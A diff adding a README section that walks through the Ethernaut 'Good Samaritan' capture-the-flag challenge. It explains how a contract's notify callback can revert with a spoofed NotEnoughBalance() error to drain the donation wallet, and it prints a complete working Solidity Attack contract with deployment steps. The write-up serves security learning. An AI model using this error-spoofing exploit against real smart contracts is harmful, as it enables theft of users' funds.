@@ -844,6 +844,82 @@ Refer these links for a better explaination:
 1. [coinmonks_medium](https://medium.com/coinmonks/26-double-entry-point-ethernaut-explained-f9c06ac93810)
 2. [daltyboy11_github](https://daltyboy11.github.io/every-ethernaut-challenge-explained/#doubleentrypoint)
 
+## 27 - Good Samaritan
+
+For reference -> [Challenge](./questions/27.Good_Samaritan.sol) | [Solution](./answers/27.Good%20Samaritan.sol)
+
+Quite a easy and interesting challenge. Here, we are given three contracts i.e `GoodSamaritan`, `Coin` and `Wallet`. The GoodSamaritan contract will deploy new instances of the Coin and the Wallet (the GoodSamaritan will be the owner) contract respectively.
+
+Think `GoodSamaritan` a wealthy individual who wants to help the community by donating 10 coins whoever requests via `requestDonation()` function.
+
+```solidity
+    function requestDonation() external returns(bool enoughBalance){
+        // donate 10 coins to requester
+        try wallet.donate10(msg.sender) {
+            return true;
+        } catch (bytes memory err) {
+            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+                // send the coins left
+                wallet.transferRemainder(msg.sender);
+                return false;
+            }
+        }
+    }
+```
+
+As you can see it uses [donate10](https://github.com/0xScratch/Web3_Security_CTFs/blob/3d0991e792aafdfbc7443ff2aa71cc3121deb2ef/Ethernaut/questions/27.Good%20Samaritan.sol#L92) function of the wallet contract which checks whether the coins (that are being donated) are enough (>=10) or not. If there is not enough coins, it will check if the reverted message/error is `NotEnoughBalance()` by the `if` condition `keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)` and then transfer the remaining coins to the requester using [transferRemainder()](https://github.com/0xScratch/Web3_Security_CTFs/blob/3d0991e792aafdfbc7443ff2aa71cc3121deb2ef/Ethernaut/questions/27.Good%20Samaritan.sol#L102) function which uses [transfer](https://github.com/0xScratch/Web3_Security_CTFs/blob/3d0991e792aafdfbc7443ff2aa71cc3121deb2ef/Ethernaut/questions/27.Good%20Samaritan.sol#L54) function of the Coin contract under the hood.
+
+Well, the vulnerability lies in that `requestDonation()` function itself as if somehow we managed to pop out that error `NotEnoughBalance()` then we can get all the coins from the wallet contract. If you notice the last piece of code within the question itself, you will find we are given an interface `INotifyable` which contains of an `notify` function and is used further in `transfer` function in order to notify the requestor about the transfer if it's a contract.
+
+```solidity
+    // where dest_ is the address, and amount_ is the amount of coins to transfer
+    if (dest_.isContract()) {
+        INotifyable(dest_).notify(amount_);
+    }
+```
+
+Guess this is the key, let me again wrap up the procedure before we arrive to the exact solution:
+
+1. First, the requestor calls the `requestDonation()` function.
+2. Then the function checks whether `GoodSamaritan` consists of enough coins in his wallet or not by executing `donate10` function (wallet contract) as a condition.
+3. We know, it do have enough coins (that's why we are attacking) and thus in `donate10` it executes the `else` condition which leads to execute `transfer()` function (coin contract).
+4. Now, heres the catch - In transfer function, if we are able to invoke that error `NotEnoughBalance()` here as it execute that `notify` function in the `if` condition, we will reach to that `else` condition in `requestDonation()` function due to this error (as the error is being checked in the `try` block) and then it will check the error message through the keccak256 hash which will be true and thus calling the `tranferRemainder` function which will transfer all the coins to the requestor (us).
+
+Here's our attacking contract:
+
+```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity >=0.8.0 <0.9.0;
+
+    interface GoodSamaritan{
+        function requestDonation() external returns(bool);
+    }
+
+    contract Attack{
+        GoodSamaritan public target;
+
+        error NotEnoughBalance();
+
+        constructor(address _victim){
+            target = GoodSamaritan(_victim);
+        }
+
+        // this function will be called when invoked by coin contract, thus reverting the "NotEnoughBalance" error
+        function notify(uint256 amount) pure external{
+            if (amount <= 10){
+                revert NotEnoughBalance();
+            }
+        }
+
+        function attack() external {
+            target.requestDonation();
+        }
+
+    }
+```
+
+All you have to do is, copy the instance address of the `GoodSamaritan` contract and then deploy the `Attack` contract by passing the copied address as an argument and then call the `attack` function. That's it!
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
